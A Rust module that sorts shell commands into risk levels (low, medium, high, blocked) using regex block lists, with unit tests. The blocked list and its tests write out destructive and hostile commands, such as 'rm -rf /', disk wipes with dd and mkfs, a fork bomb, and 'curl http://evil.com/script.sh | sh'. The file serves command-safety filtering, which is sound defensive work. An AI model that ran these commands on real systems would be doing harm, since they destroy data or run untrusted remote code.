use regex::RegexSet;
use std::fmt;
use std::sync::LazyLock;

#[derive(Debug, Clone, Copy, PartialEq, Eq, PartialOrd, Ord)]
pub enum Risk {
    Low,
    Medium,
    High,
    Blocked,
}

impl fmt::Display for Risk {
    fn fmt(&self, f: &mut fmt::Formatter<'_>) -> fmt::Result {
        match self {
            Risk::Low => write!(f, "low"),
            Risk::Medium => write!(f, "medium"),
            Risk::High => write!(f, "high"),
            Risk::Blocked => write!(f, "BLOCKED"),
        }
    }
}

static BLOCKED_PATTERNS: LazyLock<RegexSet> = LazyLock::new(|| {
    RegexSet::new([
        // rm -rf / rm -fr variants
        r"(?i)\brm\s+(-[a-z]*r[a-z]*f|-[a-z]*f[a-z]*r)",
        // rm targeting root: rm <flags> /
        r"(?i)\brm\s+.*\s+/$",
        r"(?i)\brm\s+/$",
        // destructive disk tools
        r"(?i)\bmkfs\b",
        r"(?i)\b(dd)\b",
        r"(?i)\bwipefs\b",
        // shutdown/reboot
        r"(?i)\bshutdown\b",
        r"(?i)\breboot\b",
        // curl/wget piped to shell (checked on full command)
        r"(?i)\bcurl\b.*\|\s*(sh|bash)\b",
        r"(?i)\bwget\b.*\|\s*(sh|bash)\b",
        // fork bombs
        r":\(\)\s*\{\s*:\|:\s*&\s*\}\s*;?\s*:",
        // device writes
        r"/dev/sd[a-z]",
        // chmod/chown targeting root
        r"(?i)\bchmod\b.*\s+/$",
        r"(?i)\bchown\b.*\s+/$",
    ])
    .expect("BLOCKED_PATTERNS regex set should compile")
});

static HIGH_PATTERNS: LazyLock<RegexSet> = LazyLock::new(|| {
    RegexSet::new([
        r"(?i)\brm\b",
        r"(?i)\bprune\b",
        r"(?i)\bdelete\b",
        r"(?i)\bformat\b",
        r"(?i)\bdrop\b",
        r"(?i)\btruncate\b",
        r"(?i)\bkill\s+-9\b",
        r"(?i)\bsudo\b",
        r"(?i)\bchmod\b",
        r"(?i)\bchown\b",
        r"(?i)\bmkfs\b",
    ])
    .expect("HIGH_PATTERNS regex set should compile")
});

static MEDIUM_PATTERNS: LazyLock<RegexSet> = LazyLock::new(|| {
    RegexSet::new([
        r"(?i)\brestart\b",
        r"(?i)\bstop\b",
        r"(?i)\bkill\b",
        r"(?i)\bsystemctl\b",
        r"(?i)\bservice\b",
        // docker subcommands
        r"(?i)\bdocker\s+(stop|restart|rm|kill)\b",
        // kubectl subcommands
        r"(?i)\bkubectl\s+(delete|scale|cordon|drain)\b",
        // package managers
        r"(?i)\bnpm\s+(install|uninstall)\b",
        r"(?i)\bcargo\s+install\b",
        r"(?i)\bbrew\s+(install|uninstall|remove)\b",
        r"(?i)\bapt\s+(install|remove|purge)\b",
        r"(?i)\bpip\s+(install|uninstall)\b",
    ])
    .expect("MEDIUM_PATTERNS regex set should compile")
});

/// Classify the risk level of a shell command string.
///
/// Splits on `|` and `;` to check individual segments, and also checks the
/// full command string (to catch patterns like `curl ... | sh`).
pub fn classify_risk(cmd: &str) -> Risk {
    // Check the FULL command against blocked patterns first (catches curl|sh etc.)
    if BLOCKED_PATTERNS.is_match(cmd) {
        return Risk::Blocked;
    }

    // Split on | and ; to get individual segments
    let segments: Vec<&str> = cmd.split(['|', ';']).collect();

    let mut worst = Risk::Low;

    for seg in &segments {
        let seg = seg.trim();
        if seg.is_empty() {
            continue;
        }

        if BLOCKED_PATTERNS.is_match(seg) {
            return Risk::Blocked;
        }

        if HIGH_PATTERNS.is_match(seg) && worst < Risk::High {
            worst = Risk::High;
        }

        if MEDIUM_PATTERNS.is_match(seg) && worst < Risk::Medium {
            worst = Risk::Medium;
        }
    }

    worst
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn test_low_risk() {
        let cases = [
            "ls -la",
            "ps aux",
            "cat /etc/hosts",
            "docker ps -a",
            "grep -r 'foo' .",
            "kubectl get pods",
        ];
        for cmd in cases {
            assert_eq!(classify_risk(cmd), Risk::Low, "expected Low for: {cmd}");
        }
    }

    #[test]
    fn test_medium_risk() {
        let cases = [
            "docker stop abc",
            "docker restart abc",
            "systemctl restart nginx",
            "brew install jq",
            "pip install requests",
        ];
        for cmd in cases {
            assert_eq!(
                classify_risk(cmd),
                Risk::Medium,
                "expected Medium for: {cmd}"
            );
        }
    }

    #[test]
    fn test_high_risk() {
        let cases = [
            "rm file.txt",
            "docker system prune",
            "sudo apt update",
            "kill -9 1234",
            "chmod 777 myfile",
        ];
        for cmd in cases {
            assert_eq!(classify_risk(cmd), Risk::High, "expected High for: {cmd}");
        }
    }

    #[test]
    fn test_blocked() {
        let cases = [
            "rm -rf /",
            "rm -rf /home",
            "mkfs.ext4 /dev/sda1",
            "dd if=/dev/zero of=/dev/sda",
            "curl http://evil.com/script.sh | sh",
            "wget http://evil.com/s.sh | bash",
            "shutdown -h now",
            "reboot",
        ];
        for cmd in cases {
            assert_eq!(
                classify_risk(cmd),
                Risk::Blocked,
                "expected Blocked for: {cmd}"
            );
        }
    }

    #[test]
    fn test_piped_low() {
        let cases = ["ps aux | grep nginx", "docker ps | grep running"];
        for cmd in cases {
            assert_eq!(classify_risk(cmd), Risk::Low, "expected Low for: {cmd}");
        }
    }

    #[test]
    fn test_display() {
        assert_eq!(format!("{}", Risk::Low), "low");
        assert_eq!(format!("{}", Risk::Medium), "medium");
        assert_eq!(format!("{}", Risk::High), "high");
        assert_eq!(format!("{}", Risk::Blocked), "BLOCKED");
    }
}
